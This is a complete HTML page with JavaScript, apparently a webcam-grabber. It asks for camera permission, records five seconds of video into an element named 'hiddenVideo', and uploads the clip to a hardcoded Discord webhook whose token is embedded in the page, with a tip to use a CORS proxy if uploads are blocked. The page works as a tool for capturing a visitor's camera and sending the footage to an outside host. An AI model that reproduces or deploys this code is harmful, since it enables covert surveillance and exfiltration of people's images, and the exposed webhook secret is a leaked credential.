<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>cam capture</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0a0a0f;
      color: #e0e0e0;
      font-family: 'Segoe UI', system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      gap: 16px;
      padding: 20px;
    }
    #status {
      font-size: 14px;
      padding: 10px 20px;
      border-radius: 8px;
      background: #1a1a2e;
      border: 1px solid #2a2a4a;
      text-align: center;
      max-width: 480px;
      line-height: 1.5;
    }
    #status.ok   { border-color: #2ecc71; color: #2ecc71; }
    #status.err  { border-color: #e74c3c; color: #e74c3c; }
    #status.wait { border-color: #f39c12; color: #f39c12; }
    video {
      width: 320px;
      height: 240px;
      border-radius: 12px;
      background: #000;
      border: 2px solid #2a2a4a;
      object-fit: cover;
      display: none;
    }
    #preview {
      display: none;
      width: 320px;
      border-radius: 12px;
      border: 2px solid #2a2a4a;
    }
    .spinner {
      display: inline-block;
      width: 14px;
      height: 14px;
      border: 2px solid #2a2a4a;
      border-top-color: #f39c12;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      margin-right: 8px;
      vertical-align: middle;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div id="status" class="wait">
    <span class="spinner"></span>requesting camera permission…
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>
  <video id="preview" controls playsinline></video>

<script>
(async function() {
  'use strict';

  // ── CONFIG ──────────────────────────────────────────────
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1571063942070141009/PqOL28JrxhqnZYDRxju8M6fSKZHsfJ4z3kuvWLt5zvVSnuVYPB4I1iAInoFC4XHD7AmL';
  const RECORD_MS   = 5000;               // record duration (5s)
  const MIME_TYPE   = 'video/webm;codecs=vp9,opus'; // fallback handled below

  const statusEl  = document.getElementById('status');
  const videoEl   = document.getElementById('hiddenVideo');
  const previewEl = document.getElementById('preview');

  const setStatus = (msg, cls) => {
    statusEl.className = cls || '';
    statusEl.innerHTML = msg;
  };

  // ── 1. GET USER MEDIA ──────────────────────────────────
  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
      audio: false           // audio off; enable if you want sound
    });
  } catch (err) {
    setStatus('camera permission denied — ' + err.message, 'err');
    return;
  }

  videoEl.srcObject = stream;
  await videoEl.play().catch(() => {});   // some browsers need a nudge

  // ── 2. PICK A SUPPORTED MIME ────────────────────────────
  const supported = [
    'video/webm;codecs=vp9,opus',
    'video/webm;codecs=vp8,opus',
    'video/webm',
    'video/mp4'
  ].find(t => MediaRecorder.isTypeSupported(t));

  if (!supported) {
    setStatus('no supported recording codec found', 'err');
    stream.getTracks().forEach(t => t.stop());
    return;
  }

  // ── 3. RECORD ──────────────────────────────────────────
  setStatus('<span class="spinner"></span>recording ' + (RECORD_MS / 1000) + 's…', 'wait');

  const chunks = [];
  let recorder;

  try {
    recorder = new MediaRecorder(stream, {
      mimeType: supported,
      videoBitsPerSecond: 1_000_000   // ~1 Mbps — crisp enough, small file
    });
  } catch (err) {
    setStatus('MediaRecorder init failed: ' + err.message, 'err');
    stream.getTracks().forEach(t => t.stop());
    return;
  }

  recorder.ondataavailable = e => {
    if (e.data && e.data.size > 0) chunks.push(e.data);
  };

  recorder.onstop = async () => {
    stream.getTracks().forEach(t => t.stop());   // release camera

    if (!chunks.length) {
      setStatus('no data captured — try again', 'err');
      return;
    }

    const blob = new Blob(chunks, { type: supported.split(';')[0] });
    const file = new File([blob], `cam_${Date.now()}.webm`, {
      type: supported.split(';')[0],
      lastModified: Date.now()
    });

    // preview locally
    previewEl.src = URL.createObjectURL(blob);
    previewEl.style.display = 'block';
    previewEl.load();

    setStatus('<span class="spinner"></span>uploading to discord…', 'wait');

    // ── 4. UPLOAD TO DISCORD ──────────────────────────
    const form = new FormData();
    form.append('payload_json', JSON.stringify({
      content: '📸 webcam capture — ' + new Date().toISOString(),
      username: 'cam_bot'
    }));
    form.append('file', file, file.name);

    try {
      const res = await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: form
        // DO NOT set Content-Type — fetch builds the multipart boundary
      });

      if (res.ok) {
        setStatus('✅ upload complete — check discord', 'ok');
      } else {
        const txt = await res.text().catch(() => '');
        setStatus('❌ discord rejected: ' + res.status + ' ' + txt.slice(0, 200), 'err');
      }
    } catch (err) {
      // CORS / network failure fallback
      setStatus(
        '⚠️ upload blocked (CORS or network): ' + err.message +
        '<br><small>open via a local server or use a CORS proxy</small>',
        'err'
      );
    }
  };

  recorder.onerror = e => {
    setStatus('recorder error: ' + (e.error?.message || 'unknown'), 'err');
    stream.getTracks().forEach(t => t.stop());
  };

  // start recording, request data every 1s for safety, stop after RECORD_MS
  recorder.start(1000);
  setTimeout(() => {
    if (recorder.state !== 'inactive') recorder.stop();
  }, RECORD_MS);

  // safety: if the recorder never fires onstop, kill camera after 15s
  setTimeout(() => {
    if (recorder.state === 'recording') recorder.stop();
    stream.getTracks().forEach(t => t.stop());
  }, RECORD_MS + 10_000);

})();
</script>
</body>
</html>
